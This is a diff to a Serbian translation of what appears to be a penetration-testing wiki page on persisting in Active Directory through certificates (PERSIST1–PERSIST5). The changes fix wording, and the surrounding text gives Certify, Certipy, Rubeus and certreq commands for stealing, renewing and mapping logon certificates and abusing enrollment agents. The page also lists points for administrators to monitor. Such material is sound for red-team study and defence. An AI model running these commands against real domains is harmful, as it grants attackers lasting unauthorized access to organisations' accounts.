@@ -6,9 +6,9 @@
 
 ## Razumevanje krađe korisničkih akreditiva aktivnih korisnika pomoću sertifikata – PERSIST1
 
-U scenariju gde korisnik može da zatraži sertifikat koji omogućava autentifikaciju domena, napadač ima priliku da zatraži i ukrade ovaj sertifikat kako bi održao postojanost na mreži. Po defaultu, `User` šablon u Active Directory omogućava takve zahteve, iako može ponekad biti onemogućen.
+U scenariju gde korisnik može da zatraži sertifikat koji omogućava autentifikaciju domena, napadač ima priliku da zatraži i ukrade ovaj sertifikat kako bi održao postojanost na mreži. Po defaultu, `User` šablon u Active Directory-ju omogućava takve zahteve, iako može ponekad biti onemogućen.
 
-Korišćenjem [Certify](https://github.com/GhostPack/Certify) ili [Certipy](https://github.com/ly4k/Certipy), možete pretraživati omogućene šablone koji dozvoljavaju autentifikaciju klijenata i zatim zatražiti jedan:
+Koristeći [Certify](https://github.com/GhostPack/Certify) ili [Certipy](https://github.com/ly4k/Certipy), možete pretraživati omogućene šablone koji dozvoljavaju autentifikaciju klijenata i zatim zatražiti jedan:
 ```bash
 # Enumerate client-auth capable templates
 Certify.exe find /clientauth
@@ -32,11 +32,11 @@ Rubeus.exe asktgt /user:john /certificate:C:\Temp\cert.pfx /password:CertPass! /
 # Or with Certipy
 certipy auth -pfx user.pfx -dc-ip 10.0.0.10
 ```
-> Napomena: U kombinaciji sa drugim tehnikama (vidi odeljke o KRAĐI), autentifikacija zasnovana na sertifikatima omogućava trajni pristup bez dodirivanja LSASS-a i čak iz neuzdignutih konteksta.
+> Napomena: U kombinaciji sa drugim tehnikama (vidi odeljke o KRAĐI), autentifikacija zasnovana na sertifikatima omogućava trajni pristup bez dodirivanja LSASS-a i čak iz neprivilegovanih konteksta.
 
-## Sticanje trajnosti mašine pomoću sertifikata - PERSIST2
+## Sticanje trajne prisutnosti mašine pomoću sertifikata - PERSIST2
 
-Ako napadač ima uzdignute privilegije na hostu, može registrovati kompromitovani sistemski račun mašine za sertifikat koristeći podrazumevani `Machine` šablon. Autentifikacija kao mašina omogućava S4U2Self za lokalne usluge i može obezbediti trajnu postojanost hosta:
+Ako napadač ima privilegije na hostu, može registrovati kompromitovani sistemski račun mašine za sertifikat koristeći podrazumevani `Machine` šablon. Autentifikacija kao mašina omogućava S4U2Self za lokalne usluge i može obezbediti trajnu prisutnost hosta:
 ```bash
 # Request a machine certificate as SYSTEM
 Certify.exe request /ca:dc.theshire.local/theshire-DC-CA /template:Machine /machine
@@ -44,9 +44,9 @@ Certify.exe request /ca:dc.theshire.local/theshire-DC-CA /template:Machine /mach
 # Authenticate as the machine using the issued PFX
 Rubeus.exe asktgt /user:HOSTNAME$ /certificate:C:\Temp\host.pfx /password:Passw0rd! /ptt
 ```
-## Produženje postojanosti kroz obnavljanje sertifikata - PERSIST3
+## Produženje Postojanosti Kroz Obnovu Sertifikata - PERSIST3
 
-Zloupotreba perioda važenja i obnavljanja šablona sertifikata omogućava napadaču da održi dugoročni pristup. Ako posedujete prethodno izdat sertifikat i njegov privatni ključ, možete ga obnoviti pre isteka kako biste dobili svež, dugotrajan kredencijal bez ostavljanja dodatnih artefakata zahteva povezanih sa originalnim principalom.
+Zloupotreba perioda važenja i obnove šablona sertifikata omogućava napadaču da održi dugoročni pristup. Ako posedujete prethodno izdat sertifikat i njegov privatni ključ, možete ga obnoviti pre isteka kako biste dobili svež, dugotrajan kredencijal bez ostavljanja dodatnih artefakata zahteva povezanih sa originalnim principalom.
 ```bash
 # Renewal with Certipy (works with RPC/DCOM/WebEnrollment)
 # Provide the existing PFX and target the same CA/template when possible
@@ -57,11 +57,11 @@ certipy req -u 'john@corp.local' -p 'Passw0rd!' -ca 'CA-SERVER\CA-NAME' \
 # (use the serial/thumbprint of the cert to renew; reusekeys preserves the keypair)
 certreq -enroll -user -cert <SerialOrID> renew [reusekeys]
 ```
-> Operativni savet: Pratite trajanje PFX datoteka koje drži napadač i obnavljajte ih unapred. Obnova može takođe uzrokovati da ažurirani sertifikati uključuju modernu SID mapiranje ekstenziju, čime ostaju upotrebljivi pod strožim pravilima mapiranja DC-a (vidi sledeću sekciju).
+> Operativni savet: Pratite trajanje PFX datoteka koje drži napadač i obnavljajte ih unapred. Obnova takođe može uzrokovati da ažurirani sertifikati uključuju modernu SID mapiranje ekstenziju, čineći ih upotrebljivim pod strožim DC pravilima mapiranja (vidi sledeću sekciju).
 
 ## Postavljanje Eksplicitnih Mapiranja Sertifikata (altSecurityIdentities) – PERSIST4
 
-Ako možete da pišete u `altSecurityIdentities` atribut ciljnog naloga, možete eksplicitno mapirati sertifikat pod kontrolom napadača na taj nalog. Ovo se održava kroz promene lozinke i, kada se koriste jaki formati mapiranja, ostaje funkcionalno pod modernim sprovođenjem DC-a.
+Ako možete da pišete u `altSecurityIdentities` atribut ciljnog naloga, možete eksplicitno mapirati sertifikat pod kontrolom napadača na taj nalog. Ovo ostaje aktivno i nakon promena lozinke i, kada se koriste jaki formati mapiranja, ostaje funkcionalno pod modernim DC sprovođenjem.
 
 Visok nivo toka:
 
@@ -86,10 +86,9 @@ certipy auth -pfx attacker_user.pfx -dc-ip 10.0.0.10
 ```
 Notes
 - Koristite samo jake tipove mapiranja: X509IssuerSerialNumber, X509SKI ili X509SHA1PublicKey. Slabi formati (Subject/Issuer, samo Subject, RFC822 email) su zastareli i mogu biti blokirani politikom DC-a.
-- Lanac sertifikata mora biti izgrađen do korena koji je poveren DC-u. Preduzeća CAs u NTAuth su obično povereni; neka okruženja takođe veruju javnim CAs.
+- Lanac sertifikata mora biti izgrađen do korena koji je poveren DC-u. Preduzeća CAs u NTAuth su obično poverena; neka okruženja takođe veruju javnim CAs.
 
-For more on weak explicit mappings and attack paths, see:
-
+Za više informacija o slabim eksplicitnim mapiranjima i putevima napada, pogledajte:
 
 {{#ref}}
 domain-escalation.md
@@ -97,7 +96,7 @@ domain-escalation.md
 
 ## Enrollment Agent as Persistence – PERSIST5
 
-If you obtain a valid Certificate Request Agent/Enrollment Agent certificate, you can mint new logon-capable certificates on behalf of users at will and keep the agent PFX offline as a persistence token. Abuse workflow:
+Ako dobijete važeći sertifikat za zahtev za sertifikat/sertifikat agenta za upis, možete mintovati nove sertifikate sposobne za prijavu u ime korisnika po želji i čuvati agenta PFX van mreže kao token za postojanost. Zloupotreba radnog toka:
 ```bash
 # Request an Enrollment Agent cert (requires template rights)
 Certify.exe request /ca:CA-SERVER\CA-NAME /template:"Certificate Request Agent"
@@ -114,10 +113,10 @@ Revokacija sertifikata agenta ili dozvola šablona je potrebna za uklanjanje ove
 
 ## 2025 Snažno sprovođenje mapiranja sertifikata: Uticaj na perzistenciju
 
-Microsoft KB5014754 je uveo snažno sprovođenje mapiranja sertifikata na kontrolerima domena. Od 11. februara 2025. godine, DC-ovi podrazumevano koriste potpuno sprovođenje, odbacujući slaba/ambigvna mapiranja. Praktične posledice:
+Microsoft KB5014754 je uveo snažno sprovođenje mapiranja sertifikata na kontrolerima domena. Od 11. februara 2025, DC-ovi podrazumevano koriste potpuno sprovođenje, odbacujući slaba/ambigvna mapiranja. Praktične posledice:
 
 - Sertifikati pre 2022. godine koji nemaju SID mapiranje ekstenziju mogu propasti implicitno mapiranje kada su DC-ovi u potpunom sprovođenju. Napadači mogu održati pristup ili obnavljanjem sertifikata putem AD CS (da bi dobili SID ekstenziju) ili postavljanjem snažnog eksplicitnog mapiranja u `altSecurityIdentities` (PERSIST4).
-- Eksplicitna mapiranja koristeći jake formate (Issuer+Serial, SKI, SHA1-PublicKey) nastavljaju da rade. Slabi formati (Issuer/Subject, Subject-only, RFC822) mogu biti blokirani i treba ih izbegavati za perzistenciju.
+- Eksplicitna mapiranja koristeći jake formate (Issuer+Serial, SKI, SHA1-PublicKey) nastavljaju da rade. Slabi formati (Issuer/Subject, samo Subject, RFC822) mogu biti blokirani i treba ih izbegavati za perzistenciju.
 
 Administratori bi trebali pratiti i obaveštavati o:
 - Promenama u `altSecurityIdentities` i izdavanju/obnavljanju sertifikata za Enrollment Agent i korisnike.
